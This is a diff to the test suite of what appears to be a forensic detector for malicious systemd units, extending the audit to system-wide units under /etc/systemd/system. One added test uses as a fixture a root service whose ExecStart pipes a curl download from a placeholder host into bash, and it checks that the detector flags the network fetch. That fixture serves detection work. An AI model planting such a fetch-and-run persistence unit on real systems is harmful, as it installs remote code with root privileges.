@@ -1,7 +1,11 @@
-"""Linux systemd unit deep-audit detector tests."""
+"""Linux systemd unit deep-audit detector tests + the matching
+collector's system-unit text capture."""
 
 from __future__ import annotations
 
+import os
+
+from digger.collectors.linux.systemd import SystemdCollector
 from digger.core.evidence import Artifact, EvidenceStore
 from digger.detectors.systemd_audit import (
     SystemdAuditDetector,
@@ -11,11 +15,12 @@ from digger.detectors.systemd_audit import (
 )
 
 
-def _make_user_unit(path, contents, *, owner_uid=1000):
+def _make_unit_artifact(path, contents, *, subject_prefix="user-unit",
+                          owner_uid=1000):
     return Artifact(
         collector="linux.systemd",
         category="persistence",
-        subject=f"user-unit:{path}",
+        subject=f"{subject_prefix}:{path}",
         data={
             "path": path,
             "owner_uid": owner_uid,
@@ -28,7 +33,15 @@ def _make_user_unit(path, contents, *, owner_uid=1000):
 
 
 def _seed(store, path, contents, *, owner_uid=1000):
-    store.add_artifact(_make_user_unit(path, contents, owner_uid=owner_uid))
+    store.add_artifact(_make_unit_artifact(
+        path, contents, subject_prefix="user-unit", owner_uid=owner_uid,
+    ))
+
+
+def _seed_system(store, path, contents, *, owner_uid=0):
+    store.add_artifact(_make_unit_artifact(
+        path, contents, subject_prefix="system-unit", owner_uid=owner_uid,
+    ))
 
 
 # ---- helpers ---- #
@@ -86,9 +99,9 @@ def test_parse_timer_seconds_invalid():
 # ---- detector: scope ---- #
 
 
-def test_detector_ignores_non_user_unit_artifacts(tmp_path):
-    """system-wide list-units / unit-dir artifacts are out of scope
-    today (the collector doesn't carry their text)."""
+def test_detector_ignores_directory_listing_and_systemctl_dump(tmp_path):
+    """Directory-listing and systemctl-output artifacts don't carry
+    unit text — out of scope."""
     store = EvidenceStore(tmp_path / "case")
     try:
         store.add_artifact(Artifact(
@@ -105,6 +118,24 @@ def test_detector_ignores_non_user_unit_artifacts(tmp_path):
             data={"raw": "output of systemctl list-units"},
         ))
         assert list(SystemdAuditDetector().detect(store)) == []
+    finally:
+        store.close()
+
+
+def test_detector_audits_system_unit_artifacts(tmp_path):
+    """system-unit:* artifacts (from /etc/systemd/system /
+    /run/systemd/system) get the same deep audit as user-unit:*."""
+    store = EvidenceStore(tmp_path / "case")
+    try:
+        _seed_system(
+            store,
+            "/etc/systemd/system/x.service",
+            "[Service]\nUser=root\n"
+            "ExecStart=/bin/sh -c \"curl https://e.com/x | bash\"\n",
+        )
+        findings = list(SystemdAuditDetector().detect(store))
+        kinds = {f.evidence.get("kind") for f in findings}
+        assert "systemd_network_fetch" in kinds
     finally:
         store.close()
 
@@ -478,3 +509,120 @@ def test_detector_sigma_template_has_persistence_tags():
     assert tpl["id"] == "digger-systemd-audit-template"
     assert "attack.t1543.002" in tpl["tags"]
     assert tpl["logsource"]["product"] == "linux"
+
+
+# ---- collector: system-unit text capture ---- #
+
+
+def test_collector_emits_system_unit_for_etc_systemd(tmp_path,
+                                                      monkeypatch):
+    fake_etc = tmp_path / "etc-systemd-system"
+    fake_etc.mkdir()
+    unit = fake_etc / "myservice.service"
+    unit.write_text(
+        "[Service]\nExecStart=/usr/bin/myservice\n"
+        "[Install]\nWantedBy=multi-user.target\n"
+    )
+
+    monkeypatch.setattr(
+        "digger.collectors.linux.systemd._DEEP_AUDIT_SYSTEM_DIRS",
+        [str(fake_etc)],
+    )
+    monkeypatch.setattr(
+        "digger.collectors.linux.systemd._UNIT_DIRS",
+        [],
+    )
+    monkeypatch.setattr(
+        "digger.collectors.linux.systemd._user_unit_dirs",
+        lambda: [],
+    )
+    monkeypatch.setattr(
+        "digger.collectors.linux.systemd.shutil.which",
+        lambda name: None,
+    )
+
+    arts = list(SystemdCollector().collect())
+    system_units = [a for a in arts
+                    if a.subject.startswith("system-unit:")]
+    assert len(system_units) == 1
+    assert "myservice.service" in system_units[0].subject
+    assert "ExecStart=/usr/bin/myservice" in \
+        system_units[0].data["contents"]
+
+
+def test_collector_skips_symlinks_under_etc_systemd(tmp_path,
+                                                     monkeypatch):
+    """Symlinks under /etc/systemd/system are typically vendor-shipped
+    units (/usr/lib/systemd/system/* aliased). Skip them — the
+    dir-listing artifact already captured them by name."""
+    fake_etc = tmp_path / "etc-systemd-system"
+    fake_etc.mkdir()
+    target = tmp_path / "elsewhere.service"
+    target.write_text("[Service]\nExecStart=/x\n")
+    link = fake_etc / "linked.service"
+    try:
+        os.symlink(target, link)
+    except (OSError, NotImplementedError):
+        return   # filesystem doesn't support symlinks
+
+    real = fake_etc / "real.service"
+    real.write_text("[Service]\nExecStart=/y\n")
+
+    monkeypatch.setattr(
+        "digger.collectors.linux.systemd._DEEP_AUDIT_SYSTEM_DIRS",
+        [str(fake_etc)],
+    )
+    monkeypatch.setattr(
+        "digger.collectors.linux.systemd._UNIT_DIRS", [],
+    )
+    monkeypatch.setattr(
+        "digger.collectors.linux.systemd._user_unit_dirs",
+        lambda: [],
+    )
+    monkeypatch.setattr(
+        "digger.collectors.linux.systemd.shutil.which",
+        lambda name: None,
+    )
+
+    arts = list(SystemdCollector().collect())
+    system_units = [a for a in arts
+                    if a.subject.startswith("system-unit:")]
+    names = {a.subject.split("/")[-1] for a in system_units}
+    assert "real.service" in names
+    assert "linked.service" not in names
+
+
+def test_collector_covers_timer_and_path_units(tmp_path,
+                                                 monkeypatch):
+    fake_etc = tmp_path / "etc-systemd-system"
+    fake_etc.mkdir()
+    (fake_etc / "x.service").write_text("[Service]\nExecStart=/a\n")
+    (fake_etc / "y.timer").write_text(
+        "[Timer]\nOnUnitActiveSec=1h\n",
+    )
+    (fake_etc / "z.path").write_text(
+        "[Path]\nPathChanged=/etc/passwd\n",
+    )
+    (fake_etc / "ignore.txt").write_text("not a unit")
+
+    monkeypatch.setattr(
+        "digger.collectors.linux.systemd._DEEP_AUDIT_SYSTEM_DIRS",
+        [str(fake_etc)],
+    )
+    monkeypatch.setattr(
+        "digger.collectors.linux.systemd._UNIT_DIRS", [],
+    )
+    monkeypatch.setattr(
+        "digger.collectors.linux.systemd._user_unit_dirs",
+        lambda: [],
+    )
+    monkeypatch.setattr(
+        "digger.collectors.linux.systemd.shutil.which",
+        lambda name: None,
+    )
+
+    arts = list(SystemdCollector().collect())
+    names = {a.subject.split("/")[-1]
+             for a in arts
+             if a.subject.startswith("system-unit:")}
+    assert names == {"x.service", "y.timer", "z.path"}
